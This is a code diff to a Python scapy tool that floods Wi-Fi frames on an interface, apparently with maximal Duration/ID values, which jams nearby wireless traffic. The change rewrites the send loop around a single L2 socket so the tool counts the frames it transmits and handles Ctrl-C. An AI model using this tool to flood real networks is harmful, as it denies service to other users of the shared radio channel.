@@ -31,7 +31,7 @@ import random
 import re
 import time
 
-from scapy.all import Dot11, RadioTap, sendp
+from scapy.all import Dot11, RadioTap, conf
 
 
 DURATION_MAX = 0xFFFF  # Maximum Duration/ID value, in microseconds
@@ -67,24 +67,30 @@ def mac_list(value: str) -> list[str]:
 
 
 def flood(iface: str, packets: list, interval: float, count: int) -> int:
-    """Send `packets` on `iface`. If multiple, pick one at random per frame.
+    """Send `packets` on `iface` until `count` is reached (0 = until Ctrl-C).
 
-    Returns the number of frames sent.
+    If multiple packets are given, one is picked at random per frame. A single
+    L2 socket is opened for the whole flood and each frame is counted as it goes
+    out, so the returned tally reflects the frames actually transmitted -- even
+    when the flood is stopped with Ctrl-C.
+
+    (Note: scapy's own ``sendp(..., loop=1)`` swallows KeyboardInterrupt and
+    returns no count, which is why we drive the loop ourselves here. Reporting
+    "Sent 0 frames" after a real flood was issue #1.)
     """
-    if len(packets) == 1:
-        pkt = packets[0]
-        if count > 0:
-            sendp(pkt, iface=iface, inter=interval, count=count, verbose=False)
-            return count
-        sendp(pkt, iface=iface, inter=interval, loop=1, verbose=False)
-        return 0  # only reached if sendp returns (it doesn't, until Ctrl-C)
-
+    single = packets[0] if len(packets) == 1 else None
     sent = 0
-    while count == 0 or sent < count:
-        sendp(random.choice(packets), iface=iface, verbose=False)
-        sent += 1
-        if interval > 0:
-            time.sleep(interval)
+    sock = conf.L2socket(iface=iface)
+    try:
+        while count == 0 or sent < count:
+            sock.send(single if single is not None else random.choice(packets))
+            sent += 1
+            if interval > 0:
+                time.sleep(interval)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        sock.close()
     return sent
 
 
@@ -141,11 +147,8 @@ def main() -> None:
     if not args.yes:
         input(f"\nPress Enter to flood on {args.interface} (Ctrl-C to stop)...")
 
-    try:
-        sent = flood(args.interface, packets, args.interval, args.count)
-        print(f"\n[*] Sent {sent} frames.")
-    except KeyboardInterrupt:
-        print("\nStopped.")
+    sent = flood(args.interface, packets, args.interval, args.count)
+    print(f"\n[*] Sent {sent} frames.")
 
 
 if __name__ == "__main__":
